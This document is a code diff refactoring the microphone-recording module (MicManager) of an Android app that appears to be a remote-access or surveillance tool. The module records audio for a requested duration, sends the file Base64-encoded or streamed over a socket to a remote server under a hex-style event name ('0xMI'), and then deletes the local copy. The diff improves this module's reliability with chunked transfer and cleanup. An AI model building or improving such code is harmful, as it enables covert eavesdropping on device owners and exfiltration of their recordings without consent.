@@ -9,24 +9,23 @@ import android.os.Looper;
 import android.util.Base64;
 
 import com.fason.app.core.FasonApp;
+import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
+import com.fason.app.core.network.TransferHelper;
 import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.service.MainService;
 
 import org.json.JSONObject;
 
-import java.io.BufferedInputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-// Microphone recording manager
 public final class MicManager {
 
-    private static MediaRecorder recorder;
-    private static File audioFile;
+    private static volatile MediaRecorder recorder;
+    private static volatile File audioFile;
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static final ExecutorService exec = Executors.newSingleThreadExecutor();
     private static final AtomicBoolean recording = new AtomicBoolean(false);
@@ -34,12 +33,10 @@ public final class MicManager {
 
     private MicManager() {}
 
-    // Check if recording
     public static boolean isRecording() {
         return recording.get();
     }
 
-    // Start recording
     public static void start(int seconds) {
         if (seconds <= 0 || seconds > 3600) return;
 
@@ -52,10 +49,9 @@ public final class MicManager {
 
         if (!recording.compareAndSet(false, true)) return;
 
-        // Update service type for Android 14+
-        MainService svc = MainService.getInstance();
-        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            MainService svc = MainService.getInstance();
+            if (svc != null) svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         }
 
         try {
@@ -89,10 +85,10 @@ public final class MicManager {
             recording.set(false);
             sendError("Recording failed: " + e.getMessage());
             releaseType();
+            if (audioFile != null) { audioFile.delete(); audioFile = null; }
         }
     }
 
-    // Stop recording
     public static void stop() {
         if (stopTask != null) {
             handler.removeCallbacks(stopTask);
@@ -111,71 +107,71 @@ public final class MicManager {
         releaseType();
     }
 
-    // Release service type
     private static void releaseType() {
-        MainService svc = MainService.getInstance();
-        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            MainService svc = MainService.getInstance();
+            if (svc != null) svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         }
     }
 
-    // Send audio file
     private static void sendAudio() {
+        final File fileToSend = audioFile;
+        audioFile = null;
+
         exec.execute(() -> {
             try {
-                if (audioFile == null || !audioFile.exists()) {
+                if (fileToSend == null || !fileToSend.exists()) {
                     sendError("Audio file not found");
                     return;
                 }
 
-                byte[] data = new byte[(int) audioFile.length()];
-                try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(audioFile))) {
-                    bis.read(data);
+                if (TransferHelper.shouldChunk(fileToSend.length())) {
+                    JSONObject meta = new JSONObject();
+                    meta.put(Protocol.KEY_FILE, true);
+                    meta.put(Protocol.KEY_NAME, fileToSend.getName());
+                    meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
+                    TransferHelper.streamFile(
+                        SocketClient.getInstance().getSocket(),
+                        Protocol.MIC, fileToSend, meta);
+                } else {
+                    byte[] data = TransferHelper.readSmallFile(fileToSend);
+                    if (data == null) { sendError("Read failed"); return; }
+
+                    JSONObject obj = new JSONObject();
+                    obj.put(Protocol.KEY_FILE, true);
+                    obj.put(Protocol.KEY_NAME, fileToSend.getName());
+                    obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
+                    obj.put(Protocol.KEY_SIZE, data.length);
+                    obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
+                    SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
                 }
 
-                JSONObject obj = new JSONObject();
-                obj.put("file", true);
-                obj.put("name", audioFile.getName());
-                obj.put("buffer", Base64.encodeToString(data, Base64.NO_WRAP));
-                obj.put("size", data.length);
-                obj.put("timestamp", System.currentTimeMillis());
-
-                SocketClient.getInstance().getSocket().emit("0xMI", obj);
-
-                if (audioFile != null) {
-                    audioFile.delete();
-                    audioFile = null;
-                }
             } catch (Exception e) {
                 sendError("Send failed: " + e.getMessage());
+            } finally {
+                if (fileToSend != null) {
+                    fileToSend.delete();
+                }
             }
         });
     }
 
-    // Send status
     private static void sendStatus(String status, int duration) {
         try {
             JSONObject obj = new JSONObject();
-            obj.put("status", status);
-            obj.put("duration", duration);
-            obj.put("timestamp", System.currentTimeMillis());
-            SocketClient.getInstance().getSocket().emit("0xMI", obj);
+            obj.put(Protocol.KEY_STATUS, status);
+            obj.put(Protocol.KEY_DURATION, duration);
+            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
+            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
         } catch (Exception ignored) {}
     }
 
-    // Send error
     private static void sendError(String error) {
         try {
             JSONObject obj = new JSONObject();
-            obj.put("error", true);
-            obj.put("message", error);
-            obj.put("timestamp", System.currentTimeMillis());
-            SocketClient.getInstance().getSocket().emit("0xMI", obj);
+            obj.put(Protocol.KEY_ERROR, error);
+            obj.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
+            SocketClient.getInstance().getSocket().emit(Protocol.MIC, obj);
         } catch (Exception ignored) {}
-    }
-
-    // Alias for start
-    public static void startRecording(int seconds) {
-        start(seconds);
     }
 }
